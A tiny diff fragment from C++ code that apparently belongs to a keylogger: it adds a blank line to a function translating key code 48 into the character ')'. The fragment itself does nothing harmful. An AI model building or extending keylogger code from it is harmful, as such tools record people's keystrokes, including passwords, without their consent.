@@ -15,6 +15,7 @@ KeyLogger::~KeyLogger() {}
 
 char KeyLogger::ChangeKeyToXChar(int key)
 {
+
 	if (key == 48) {
 		return ')';
 	}
